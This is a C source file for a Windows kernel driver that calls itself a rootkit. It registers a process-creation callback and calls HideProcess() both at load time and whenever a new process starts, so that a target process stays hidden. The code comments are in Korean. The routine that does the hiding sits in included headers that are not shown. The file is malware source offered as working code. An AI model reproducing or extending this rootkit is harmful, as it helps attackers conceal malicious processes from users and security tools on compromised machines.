#include <ntddk.h>
#include "Hide.h"
#include "Offset.h"

VOID ProcessCreateCallback(
	_In_	HANDLE parentPid,
	_In_	HANDLE processId,
	_In_	BOOLEAN isCreate
)
{
	UNREFERENCED_PARAMETER(parentPid);

	if (isCreate)
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] New process detected. (PID: %u) Finding target process.\n", PtrToUint(processId));
		HideProcess();
	}
}

VOID OnUnload(
	_In_	PDRIVER_OBJECT driverObject
)
{
	UNREFERENCED_PARAMETER(driverObject);
	PsSetCreateProcessNotifyRoutine(ProcessCreateCallback, TRUE);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] Unloading driver.\n");
}

NTSTATUS
DriverEntry(
	_In_	PDRIVER_OBJECT pDriverObject,
	_In_	PUNICODE_STRING pRegistryPath)
{
	UNREFERENCED_PARAMETER(pDriverObject);
	UNREFERENCED_PARAMETER(pRegistryPath);

	if (InitializeOffsets() == FALSE)
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] Failed to get EPROCESS offsets.\n");
		return STATUS_FAILED_DRIVER_ENTRY;
	}

	// 프로세스 새로 생성 시 숨기기 위해 콜백함수 루틴 등록
	NTSTATUS status = PsSetCreateProcessNotifyRoutine(ProcessCreateCallback, FALSE);
	if (!NT_SUCCESS(status))
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] PsSetCreateProcessNotifyRoutine failed.\n");
		return STATUS_FAILED_DRIVER_ENTRY;
	}
	
	HideProcess();

	// 언로드 루틴 등록
	pDriverObject->DriverUnload = OnUnload;

	return STATUS_SUCCESS;
}